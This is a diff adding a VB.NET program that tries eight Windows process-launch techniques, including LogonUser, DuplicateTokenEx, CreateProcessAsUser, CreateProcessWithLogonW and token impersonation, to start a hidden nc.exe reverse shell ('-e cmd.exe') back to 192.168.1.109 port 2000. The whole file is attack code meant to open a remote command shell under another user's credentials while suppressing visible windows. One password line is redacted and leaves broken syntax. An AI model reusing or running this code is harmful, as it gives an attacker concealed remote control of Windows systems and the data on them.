@@ -1,0 +1,317 @@
+﻿Option Strict On
+Option Explicit On
+
+Imports System
+Imports System.Runtime.InteropServices
+Imports System.Security.Principal
+Imports System.Security.Permissions
+Imports System.Threading
+
+<Assembly: SecurityPermissionAttribute(SecurityAction.RequestMinimum, UnmanagedCode:=True), Assembly: PermissionSetAttribute(SecurityAction.RequestMinimum, Name:="FullTrust")> 
+Public Class ProcessAsUser2
+    Dim strUser As String = Nothing
+    Dim strPassword As String = Nothing
+    Dim strServer As String = "192.168.1.109"
+    Dim strPort As String = "2000"
+    Dim strApplication As String = Nothing
+
+#Region "Const"
+
+    Const LOGON32_LOGON_INTERACTIVE As Integer = 2
+    Const LOGON32_PROVIDER_DEFAULT As Integer = 0
+    Const WINSTA_ALL_ACCESS As Integer = &H37F
+    Const READ_CONTROL As Integer = &H20000
+    Const WRITE_DAC As Integer = &H40000
+    Const DESKTOP_WRITEOBJECTS As Integer = &H80
+    Const DESKTOP_READOBJECTS As Integer = &H1
+    Const GENERIC_ALL As Integer = &H10000000
+    Const MAXIMUM_ALLOWED As Integer = &H2000000
+    Const SECURITY_IMPERSONATION As Integer = 2
+    Const TOKEN_PRIMARY As Integer = 1
+    Const LOGON_NETCREDENTIALS_ONLY As Integer = &H1&
+    Const CREATE_DEFAULT_ERROR_MODE As Integer = &H4000000
+
+#End Region
+
+#Region "Structures"
+
+    Public Structure PROCESS_INFO
+        Public hProcess As IntPtr
+        Public hThread As IntPtr
+        Public dwProcessId As Integer
+        Public dwThreadId As Integer
+    End Structure
+
+    Public Structure STARTUP_INFO
+        Public cb As Integer
+        Public lpReserved As Integer
+        <MarshalAs(UnmanagedType.LPTStr)> Public lpDesktop As String
+        <MarshalAs(UnmanagedType.LPTStr)> Public lpTitle As String
+        Public dwX As Long
+        Public dwY As Integer
+        Public dwXSize As Integer
+        Public dwYSize As Integer
+        Public dwXCountChars As Integer
+        Public dwYCountChars As Integer
+        Public dwFillAttribute As Integer
+        Public dwFlags As Integer
+        Public wShowWindow As Short
+        Public cbReserved2 As Short
+        Public lpReserved2 As Integer
+        Public hStdInput As Integer
+        Public hStdOutput As Integer
+        Public hStdError As Integer
+    End Structure
+
+    Public Structure SECURITY_ATTRIBUTES
+        Public nLength As Integer
+        Public lpSecurityDescriptor As IntPtr
+        Public bInheritHandle As Boolean
+    End Structure
+
+#End Region
+
+#Region "API Imports"
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll")> _
+    Shared Function CreateProcessWithLogonW(<MarshalAs(UnmanagedType.LPWStr)> ByVal lpUsername As String, _
+                                            <MarshalAs(UnmanagedType.LPWStr)> ByVal lpDomain As String, _
+                                            <MarshalAs(UnmanagedType.LPWStr)> ByVal lpPassword As String, _
+                                            ByVal dwLogonFlags As Integer, _
+                                            <MarshalAs(UnmanagedType.LPWStr)> ByVal lpApplicationName As String, _
+                                            <MarshalAs(UnmanagedType.LPWStr)> ByVal lpCommandLine As String, _
+                                            ByVal lpCreationFlags As Integer, _
+                                            ByVal lpVoid As Integer, _
+                                            <MarshalAs(UnmanagedType.LPWStr)> ByVal lpCurrentDirectory As String, _
+                                            ByRef lpStartupInfo As STARTUP_INFO, _
+                                            ByRef lpProcessInfo As PROCESS_INFO) As Integer
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll")> _
+Shared Function LogonUser(ByVal lpUsername As String, _
+                            ByVal lpDomain As String, _
+                            ByVal lpPassword As String, _
+                            ByVal dwLogonType As Integer, _
+                            ByVal dwLogonProvider As Integer, _
+                            ByRef pToken As IntPtr) As Boolean
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\user32.dll", SetLastError:=True)> _
+Shared Function GetProcessWindowStation() As IntPtr
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\user32.dll", SetLastError:=True)> _
+Shared Function OpenWindowStation(ByVal lpszWinSta As String, _
+                                    ByVal fInherit As Boolean, _
+                                    ByVal dwDesiredAccess As UInteger) As IntPtr
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\user32.dll", SetLastError:=True)> _
+Shared Function SetProcessWindowStation(ByVal hWinSta As IntPtr) As Boolean
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\user32.dll", SetLastError:=True)> _
+Shared Function OpenDesktop(ByVal lpszDesktop As String, _
+                            ByVal dwFlags As Integer, _
+                            ByVal fInherit As Boolean, _
+                            ByVal dwDesiredAccess As UInteger) As IntPtr
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll", SetLastError:=True)> _
+Shared Function ImpersonateLoggedOnUser(ByVal hToken As IntPtr) As Boolean
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll", SetLastError:=True)> _
+Shared Function CreateProcessAsUser(ByVal pToken As IntPtr, _
+                                    ByVal lpApplicationName As String, _
+                                    ByRef lpCommandLine As String, _
+                                    ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, _
+                                    ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, _
+                                    ByVal bInheritHandles As Boolean, _
+                                    ByVal dwCreationFlags As Integer, _
+                                    ByRef lpEnvironment As IntPtr, _
+                                    ByVal lpCurrentDirectory As String, _
+                                    ByRef lpStartupInfo As STARTUP_INFO, _
+                                    ByRef lpProcessInfo As PROCESS_INFO) As Boolean
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll", SetLastError:=True)> _
+Shared Function CreateProcessAsUserW(ByVal pToken As IntPtr, _
+                                ByVal lpApplicationName As String, _
+                                ByRef lpCommandLine As String, _
+                                ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, _
+                                ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, _
+                                ByVal bInheritHandles As Boolean, _
+                                ByVal dwCreationFlags As Integer, _
+                                ByRef lpEnvironment As IntPtr, _
+                                ByVal lpCurrentDirectory As String, _
+                                ByRef lpStartupInfo As STARTUP_INFO, _
+                                ByRef lpProcessInfo As PROCESS_INFO) As Boolean
+    End Function
+
+    <DllImport("C:\\Windows\\System32\\advapi32.dll", SetLastError:=True)> _
+Shared Function DuplicateTokenEx(ByVal hExistingToken As IntPtr, _
+                                    ByVal dwDesiredAccess As UInteger, _
+                                    ByRef lpTokenAttributes As SECURITY_ATTRIBUTES, _
+                                    ByVal ImpersonationLevel As Integer, _
+                                    ByVal TokenType As Integer, _
+                                    ByRef phNewToken As IntPtr) As Boolean
+    End Function
+
+#End Region
+
+    <PermissionSetAttribute(SecurityAction.Demand, Name:="FullTrust")> _
+    Sub Main()
+        Try
+            Dim bReturn As Boolean
+            Dim strNC As String = System.Environment.CurrentDirectory + "\nc.exe "
+            Dim strNCArgs As String = strServer + " " + strPort + " -e cmd.exe"
+            Dim strNotepad As String = "c:\windows\notepad.exe"
+
+            'token returned from LogonUser and CreateProcessAsUser
+            Dim pUserToken As IntPtr = IntPtr.Zero
+
+            'Security attributes struct
+            Dim pSecurityAttributes As SECURITY_ATTRIBUTES
+            pSecurityAttributes.bInheritHandle = True
+            pSecurityAttributes.nLength = Marshal.SizeOf(pSecurityAttributes)
+            pSecurityAttributes.lpSecurityDescriptor = IntPtr.Zero
+            'Start information struct
+            Dim pStartInfo As STARTUP_INFO = Nothing
+            pStartInfo.cb = Len(pStartInfo)
+            pStartInfo.lpTitle = ""
+            pStartInfo.dwFlags = 0&
+            pStartInfo.lpDesktop = "winsta0\default"
+            'Process information struct
+            Dim pProcessInfo As PROCESS_INFO
+            'Enviroment variable
+            Dim pEnviroment As IntPtr = IntPtr.Zero
+
+            'Method 1 - Use the built in .NET process class no user
+            startProcessNoUser()
+
+            'method 2 - .NET with new 2.0 user and password
+            startProcess()
+
+            'method 3 - Windows API LogonUser and CreateProcessAsUser
+
+            bReturn = LogonUser("example-user", ".", "example-password", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, pUserToken)
+            System.Console.WriteLine("Method 3 LogonUser - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = CreateProcessAsUser(pUserToken, System.Environment.CurrentDirectory + "\nc.exe", strServer + " " + strPort + " -e cmd.exe", Nothing, Nothing, False, 0, Nothing, System.Environment.CurrentDirectory, pStartInfo, pProcessInfo)
+            System.Console.WriteLine("Method 3 CreateProcessAsUser - " + CStr(Marshal.GetLastWin32Error()))
+            System.Console.WriteLine()
+
+            'Method 4 - Same as 3 but add DuplicateTokenEx after LogonUser
+
+            'Primary token
+            Dim DupedToken As IntPtr = IntPtr.Zero
+
+            bReturn = LogonUser("example-user", ".", "example-password", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, pUserToken)
+            System.Console.WriteLine("Method 4 LogonUser - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = DuplicateTokenEx(pUserToken, MAXIMUM_ALLOWED, pSecurityAttributes, SECURITY_IMPERSONATION, TOKEN_PRIMARY, DupedToken)
+            System.Console.WriteLine("Method 4 DuplicateTokenEx - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = CreateProcessAsUser(pUserToken, strNC, strNCArgs, pSecurityAttributes, pSecurityAttributes, False, 0, Nothing, System.Environment.CurrentDirectory, pStartInfo, pProcessInfo)
+            System.Console.WriteLine("Method 4 CreateProcessAsUser - " + CStr(Marshal.GetLastWin32Error()))
+            System.Console.WriteLine()
+
+            'Method 5 - Same as 4 but use the unicode version of CreateProcessAsUser (CreateProcessAsUserW)
+            bReturn = LogonUser("example-user", ".", "example-password", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, pUserToken)
+            System.Console.WriteLine("Method 5 LogonUser - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = DuplicateTokenEx(pUserToken, MAXIMUM_ALLOWED, pSecurityAttributes, SECURITY_IMPERSONATION, TOKEN_PRIMARY, DupedToken)
+            System.Console.WriteLine("Method 5 DuplicateTokenEx - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = CreateProcessAsUserW(pUserToken, strNC, strNCArgs, pSecurityAttributes, pSecurityAttributes, False, 0, Nothing, System.Environment.CurrentDirectory, pStartInfo, pProcessInfo)
+            System.Console.WriteLine("Method 5 CreateProcessAsUserW - " + CStr(Marshal.GetLastWin32Error()))
+            System.Console.WriteLine()
+
+            'Method 6 - Use the API CreateProcessWithLogonW
+            Dim iReturn As Integer
+            iReturn = CreateProcessWithLogonW("example-user", System.Environment.MachineName, "example-password", LOGON_NETCREDENTIALS_ONLY, Nothing, System.Environment.CurrentDirectory + strNC + " " + strNCArgs, CREATE_DEFAULT_ERROR_MODE, Nothing, System.Environment.CurrentDirectory, pStartInfo, pProcessInfo)
+            System.Console.WriteLine("Method 6 CreateProcessWithLogonW - " + CStr(Marshal.GetLastWin32Error()))
+            System.Console.WriteLine()
+
+            'Method 7 - APIs with everything but the kitchen thrown in
+            Dim hwinstaSave As IntPtr
+            Dim hwinsta As IntPtr
+            Dim hdesk As IntPtr
+
+            hwinstaSave = GetProcessWindowStation()
+            System.Console.WriteLine("Method 7 GetProcessWindowStation - " + CStr(Marshal.GetLastWin32Error()))
+            hwinsta = OpenWindowStation("winsta0", False, WINSTA_ALL_ACCESS)
+            System.Console.WriteLine("Method 7 OpenWindowStation - " + CStr(Marshal.GetLastWin32Error()))
+            SetProcessWindowStation(hwinsta)
+            System.Console.WriteLine("Method 7 SetProcessWindowStation - " + CStr(Marshal.GetLastWin32Error()))
+            hdesk = OpenDesktop("default", 0, False, READ_CONTROL And WRITE_DAC And DESKTOP_WRITEOBJECTS And DESKTOP_READOBJECTS)
+            System.Console.WriteLine("Method 7 OpenDesktop - " + CStr(Marshal.GetLastWin32Error()))
+            SetProcessWindowStation(hwinstaSave)
+            System.Console.WriteLine("Method 7 SetProcessWindowStation - " + CStr(Marshal.GetLastWin32Error()))
+
+            'use method 4
+            bReturn = LogonUser("example-user", ".", "example-password", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, pUserToken)
+            System.Console.WriteLine("Method 7 LogonUser - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = DuplicateTokenEx(pUserToken, MAXIMUM_ALLOWED, pSecurityAttributes, SECURITY_IMPERSONATION, TOKEN_PRIMARY, DupedToken)
+            System.Console.WriteLine("Method 7 DuplicateTokenEx - " + CStr(Marshal.GetLastWin32Error()))
+            bReturn = CreateProcessAsUser(pUserToken, strNC, strNCArgs, Nothing, Nothing, False, 0, Nothing, System.Environment.CurrentDirectory, pStartInfo, pProcessInfo)
+            System.Console.WriteLine("Method 7 CreateProcessAsUser - " + CStr(Marshal.GetLastWin32Error()))
+            System.Console.WriteLine()
+
+            'Method 8 - Use some crazy ideas from .NET to set impersonation
+
+            'get token from LogonUser API
+            bReturn = LogonUser("example-user", ".", "example-password", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, pUserToken)
+            System.Console.WriteLine("Method 8 LogonUser - " + CStr(Marshal.GetLastWin32Error()))
+            Dim newId As New WindowsIdentity(pUserToken)
+            Dim impersonatedUser As WindowsImpersonationContext = newId.Impersonate()
+            'Use method 1
+            startProcessNoUser()
+
+            Console.ReadKey()
+
+        Catch ex As Exception
+            Console.WriteLine(" Exception thrown " + ex.ToString)
+        End Try
+    End Sub
+
+    Public Sub startProcessNoUser()
+        Try
+            Dim p As New Process
+
+            p.StartInfo.Arguments = strServer + " " + strPort + " -e cmd.exe"
+            p.StartInfo.CreateNoWindow = True
+            p.StartInfo.ErrorDialog = False
+            p.StartInfo.FileName = System.Environment.CurrentDirectory + "\nc.exe"
+            p.StartInfo.UseShellExecute = False
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+            p.StartInfo.RedirectStandardOutput = True
+            Console.WriteLine("Method 1 .NET No User - Command: " + p.StartInfo.FileName + " " + p.StartInfo.Arguments)
+            p.Start()
+        Catch ex As Exception
+            Console.WriteLine(ex.ToString)
+        End Try
+    End Sub
+
+    Public Sub startProcess()
+        Try
+            Dim p As New Process
+            p.StartInfo.UserName = "REDACTED"
+            Dim ssPass As New System.Security.SecureString
+            Dim c As Char
+            For Each c In "example-password"
+                ssPass.AppendChar(c)
+            Next
+            p.StartInfo.Password =REDACTED
+            p.StartInfo.Domain = System.Environment.MachineName
+            p.StartInfo.Arguments = strServer + " " + strPort + " -e cmd.exe"
+            p.StartInfo.CreateNoWindow = True
+            p.StartInfo.ErrorDialog = False
+            p.StartInfo.FileName = System.Environment.CurrentDirectory + "\nc.exe"
+            p.StartInfo.UseShellExecute = False
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+            p.StartInfo.RedirectStandardOutput = True
+            Console.WriteLine("Method 1 .NET No User - User: " + p.StartInfo.Domain + "\" + p.StartInfo.UserName + " Command: " + p.StartInfo.FileName + " " + p.StartInfo.Arguments)
+            p.Start()
+        Catch ex As Exception
+            Console.WriteLine(ex.ToString)
+        End Try
+    End Sub
+
+End Class
